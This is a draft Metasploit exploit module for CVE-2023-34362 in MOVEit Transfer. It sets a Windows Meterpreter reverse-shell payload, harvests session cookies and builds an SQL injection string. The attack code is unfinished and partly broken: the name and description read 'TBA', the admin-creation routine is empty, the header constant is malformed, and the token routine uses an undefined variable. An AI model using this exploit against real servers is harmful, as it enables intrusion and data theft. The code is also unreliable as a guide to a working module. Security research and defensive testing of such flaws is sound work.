##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


##
# https://docs.google.com/document/d/11jEIf-zFXVqNzJ7JZW_Kc4YMyF4GkFo8o1LGl6NS01E/edit
# https://github.com/sfewer-r7/CVE-2023-34362
# https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis
# https://github.com/sfewer-r7/CVE-2023-34362/blob/main/CVE-2023-34362.rb
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  HEADERS => [
    'X-siLock-AgentBrand', 'X-siLock-AgentVersion', 'X-siLock-CanAcceptCompress', 'X-siLock-CanAcceptLumps', 'X-siLock-CanCheckHash',
    'X-siLock-Challenge', 'X-siLock-CheckVirus', 'X-siLock-ClientType', 'X-siLock-CS2-Allow204', 'X-siLock-CS2-AVDLP',
    'X-siLock-CS2-BlockOnError', 'X-siLock-CS2-ChunkSizeKB', 'X-siLock-CS2-ConnTimeoutSecs', 'X-siLock-CS2-DoPreview', 'X-siLock-CS2-Engine',
    'X-siLock-CS2-Error', 'X-siLock-CS2-ISTag', 'X-siLock-CS2-MaxFileSize', 'X-siLock-CS2-Name', 'X-siLock-CS2-RecvTimeoutSecs',
    'X-siLock-CS2-SendTimeoutSecs', 'X-siLock-CS2-Tries', 'X-siLock-CS2-Type', 'X-siLock-CS2-URL', 'X-siLock-CS-Allow204',
    'X-siLock-CS-AVDLP', 'X-siLock-CS-BlockOnError', 'X-siLock-CS-ChunkSizeKB', 'X-siLock-CS-ConnTimeoutSecs', 'X-siLock-CS-DoPreview',
    'X-siLock-CS-Engine', 'X-siLock-CS-Error', 'X-siLock-CS-ISTag', 'X-siLock-CS-MaxFileSize', 'X-siLock-CS-Name',
    'X-siLock-CS-RecvTimeoutSecs', 'X-siLock-CSRFToken', 'X-siLock-CS-SendTimeoutSecs', 'X-siLock-CS-Tries', 'X-siLock-CS-URL',
    'X-siLock-DLPChecked', 'X-siLock-DLPViolation', 'X-siLock-DownloadToken', 'X-siLock-Duration', 'X-siLock-ErrorCode',
    'X-siLock-ErrorDescription', 'X-siLock-FileID', 'X-siLock-FileIDToDelete', 'X-siLock-FilePath', 'X-siLock-FileSize',
    'X-siLock-FolderID', 'X-siLock-FolderPath', 'X-siLock-FolderType', 'X-siLock-Hash', 'X-siLock-HashOK',
    'X-siLock-InstID', 'X-siLock-IntegrityVerified', 'X-siLock-IPAddress', 'X-siLock-LangCode', 'X-siLock-LoginName',
    'X-siLock-LogRecID', 'X-siLock-MailboxOwner', 'X-siLock-NotificationID', 'X-siLock-OriginalFilename', 'X-siLock-PackageID',
    'X-siLock-PartialFileID', 'X-siLock-PartialFilePath', 'X-siLock-Password', 'X-siLock-RealName', 'X-siLock-RelativePath',
    'X-siLock-ResumeInPlace', 'X-siLock-SessionID', 'X-siLock-SessVar', 'X-siLock-TimeBegun', 'X-siLock-TimeElapsed',
    'X-siLock-TimeEnded', 'X-siLock-Transaction', 'X-siLock-Untrusted', 'X-siLock-UploadComment', 'X-siLock-UserFilename',
    'X-siLock-Username', 'X-siLock-VirusChecked', 'X-siLock-XferFormat',
  ]

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TBA',
        'Description' => %q{
          TBA
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # PoC https://github.com/sfewer-r7/CVE-2023-34362
          'bwatters-r7' # module
        ],
        'References' => [
          ['CVE', '2023-34362' ],
          ['URL', 'https://github.com/sfewer-r7/CVE-2023-34362']
        ],
        'Platform' => 'win',
        'Arch' => [ARCH_X64, ARCH_CMD],
        'Targets' => [
          [
            'Windows Fetch',
            {
              'Arch' => ARCH_CMD,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse_tcp',
                'RPORT' => 80
              }
            }
          ],
        ],
        'DisclosureDate' => '2023-05-31',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]
        }
      )
    )
    register_options(
      [
        Msf::OptString.new('TARGET_URI', [ false, 'Target URI', '/api/v1/token']),
        Msf::OptString.new('USERNAME', [ true, 'Username', Rex::Text.rand_text_alphanumeric(5..11)]),
        Msf::OptString.new('PASSWORD', [ true, 'Password', Rex::Text.rand_text_alphanumeric(5..11)])

      ]
    )
  end

  def token
    begin
      res = send_request_cgi({
                               'method' => 'GET',
                               'uri' => normalize_uri(uri),
                               'connection' => 'keep-alive',
                               'accept' => '*/*'
                             })

      cookies = res.get_cookies
      vprint_status("Cookies: #{cookies}")
      # Get the session id from the cookies
      if cookies =~ /ASP.NET_SessionId=([a-z0-9]+);/
        token = $1
      else
        fail_with(Msf::Exploit::Failure::Unknown, 'Could not find token from cookies!')
      end

      # Get the InstID from the cookies
      if cookies =~ /siLockLongTermInstID=([0-9]+);/
        instid = $1
      else
        fail_with(Msf::Exploit::Failure::Unknown, 'Could not find InstID from cookies!')
      end
    end
  end

  def sqli_payload(sql_payload)
    # Create the initial injection, and create the session object
    payload = [
      # The initial injection
      "#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.com')",
    ].concat(sql_payload)

    # Join our payload, and terminate with a comment character
    return payload.join(';') + ';#'
  end


  def create_sysadmin

  end
end
